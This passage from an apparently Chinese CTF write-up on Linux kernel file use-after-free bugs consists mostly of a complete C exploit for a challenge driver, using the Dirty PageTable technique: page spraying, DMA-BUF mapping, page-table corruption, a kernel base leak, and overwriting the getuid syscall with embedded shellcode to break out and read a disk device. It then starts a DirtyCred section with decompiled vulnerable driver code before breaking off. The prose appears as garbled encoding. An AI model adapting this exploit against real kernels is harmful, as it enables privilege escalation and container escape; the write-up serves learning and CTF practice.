index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1339</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/vda&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose...&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">        read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">213</span>] = &#123;</span><br><span class="line">    <span class="number">0xF3</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xFA</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8D</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>,</span><br><span class="line">    <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x26</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0xBF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>,</span><br><span class="line">    <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>, <span class="number">0x68</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xD0</span>, <span class="number">0x0A</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0xBB</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xF0</span>, <span class="number">0xC0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xBF</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x66</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xC6</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0xCC</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *page_spray[N_PAGESPRAY];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/tmp/elf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/safenote&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dmafd = creat(<span class="string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dmafd == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;/dev/dma_heap/system&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Prepare pages for PTE&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i*<span class="number">0x10000</span>UL),</span><br><span class="line">                            <span class="number">0x8000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                            MAP_ANONYMOUS|MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) err_exit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        add(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp_fd[TMP_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        tmp_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(tmp_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">            uaf(uaf_index);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        del(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> read_fd[READ_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(uaf_index);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">        <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line">    <span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">            uaf_read_fd = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        close(tmp_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(read_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        close(write_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating PTEs...&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Allocate DMA-BUF heap&quot;</span>);</span><br><span class="line">    <span class="type">int</span> dma_buf_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.len = <span class="number">0x1000</span>;</span><br><span class="line">    data.fd_flags = O_RDWR;</span><br><span class="line">    data.heap_flags = <span class="number">0</span>;</span><br><span class="line">    data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (2)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = N_PAGESPRAY/<span class="number">2</span>; i &lt; N_PAGESPRAY; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Searching for overlapping page...&quot;</span>);</span><br><span class="line">    <span class="comment">// Search for page that overlaps with other physical page</span></span><br><span class="line">    <span class="type">void</span> *evil = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="comment">// We wrote &#x27;H&#x27;(=&#x27;A&#x27;+7) but if it changes the PTE overlaps with the file</span></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">char</span>*)(page_spray[i] + <span class="number">7</span>*<span class="number">0x1000</span>) != <span class="string">&#x27;A&#x27;</span> + <span class="number">7</span>) &#123; <span class="comment">// +38h: f_count</span></span><br><span class="line">        evil = page_spray[i] + <span class="number">0x7000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found overlapping page: %p\n&quot;</span>, evil);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evil == <span class="literal">NULL</span>) err_exit(<span class="string">&quot;target not found :(&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Place PTE entry for DMA buffer onto controllable PTE</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Remapping...&quot;</span>);</span><br><span class="line">    munmap(evil, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">void</span> *dmabuf = mmap(evil, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="number">0</span>);</span><br><span class="line">    *(<span class="type">char</span>*)dmabuf = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get physical AAR/AAW</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// Corrupt physical address of DMA-BUF</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DMA-BUF now points to PTE: 0x%016lx\n&quot;</span>, *(<span class="type">size_t</span>*)dmabuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Leak kernel physical base</span></span><br><span class="line">    <span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">            wwwbuf = page_spray[i];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> phys_base = ((*(<span class="type">size_t</span>*)wwwbuf) &amp; ~<span class="number">0xfff</span>) - <span class="number">0x3a01000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Physical kernel base address: 0x%016lx\n&quot;</span>, phys_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Overwrite setxattr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Overwriting getuid...&quot;</span>);</span><br><span class="line">    <span class="comment">// ffffffff811ab7e0 t __do_sys_getuid</span></span><br><span class="line">    <span class="type">size_t</span> phys_func = phys_base + <span class="number">0x1ab7e0</span> - <span class="number">0x3000</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = (phys_func &amp; ~<span class="number">0xfff</span>) | <span class="number">0x8000000000000067</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = getpid();</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = (<span class="type">size_t</span>)&amp;win;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_cs;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_rflags;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_sp;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(wwwbuf + (phys_func &amp; <span class="number">0xfff</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] GO!GO!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed...&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶æ‰“è¿œç¨‹æ—¶çš„æ•ˆæœğŸ˜‹ï¼š</p><img src="/2024/11/12/fileuaf/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="Dirty-Cred-in-file-uaf"><a href="#Dirty-Cred-in-file-uaf" class="headerlink" title="Dirty Cred in file uaf"></a>Dirty Cred in file uaf</h2><p>å¯ä»¥çœ‹åˆ° Dirty PageTable çš„åŠŸèƒ½éå¸¸çš„å¼ºå¤§ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬ç›´æ¥ä¿®æ”¹å†…æ ¸çš„ä»£ç æ®µç„¶åç›´æ¥åŠ«æŒç¨‹åºæµï¼Œæ‰“èµ·æ¥ä¹Ÿéå¸¸çš„éº»çƒ¦ã€‚å¦‚æœæˆ‘ä»¬çš„ç›®æ ‡ä¸æ˜¯å®¹å™¨é€ƒé€¸è€Œæ˜¯è·å– flag æˆ–è€…ææƒï¼Œæˆ‘ä»¬å®Œå…¨æœ‰æ›´åŠ å¿«çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ DirtyCredã€‚eeee å¸ˆå‚…ä¹‹å‰ç»™æˆ‘å‘äº†ä¸€é“å†…æ ¸é¢˜ï¼Œç¬”è€…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ demoï¼Œä¸‹é¢ç»™å‡ºé¢˜ç›®çš„ä»£ç ã€‚  </p><h3 id="vuln-code"><a href="#vuln-code" class="headerlink" title="vuln code"></a>vuln code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vuln_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">322420463</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !register_file )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    fput(register_file, cmd, arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">-25LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">322428589</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( register_file )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-16LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        register_file = (file *)fget((<span class="type">unsigned</span> <span class="type">int</span>)arg);</span><br><span class="line">        <span class="keyword">if</span> ( register_file )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨-1"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a>æ¼æ´åˆ†æä¸åˆ©ç”¨</h3><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå†…æ ¸é©±åŠ¨æ˜¯ä¸€ä¸ªç»å…¸çš„èœå•ç¨‹åºï¼Œä»–å…è®¸æˆ‘ä»¬å¯¹æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œ fget å’Œ fput ä¸¤ä¸ªæ“ä½œã€‚fget ä¼šä»¤ file-&gt;f_count çš„å€¼åŠ ä¸€ï¼Œfput ä¼šä»¤ file-&gt;f_count çš„å€¼å‡ä¸€ã€‚å½“ file ç»“æ„ä½“çš„ f_count çš„å€¼ä¸ºä¸€æ—¶ä¼šè¢«é‡Šæ”¾æ‰ï¼Œè€Œç”¨æˆ·æ€ä¾ç„¶æœ‰ç€å¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„å¼•ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç™½ç»™çš„ file uaf 